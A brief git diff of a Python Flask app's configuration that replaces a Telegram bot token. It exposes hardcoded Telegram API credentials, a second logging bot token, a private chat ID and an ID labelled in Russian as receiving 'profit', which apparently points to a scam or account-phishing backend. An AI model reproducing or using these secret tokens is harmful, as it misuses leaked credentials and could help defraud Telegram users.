@@ -10,7 +10,7 @@ CORS(app)
 # --- ТВОИ НАСТРОЙКИ ---
 API_ID = 30356139 
 API_HASH = 'eaf8c970ff553abe2f1578717c82e50e'
-BOT_TOKEN = '8747801119:AAEsW2BkO4sZvfB1Y6IYlHa6nfqp5RInbl4'
+BOT_TOKEN = '8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY'
 LOG_BOT_TOKEN = '8728061701:AAHNSoJRp7yQYPPfDp8y53A3CLj-f2w3FCA' # Токен второго бота для уведомлений
 CHAT_ID = '-1003794470658' # ID твоего приватного чата
 MY_ID = "8486064073" # Твой ID для получения профита
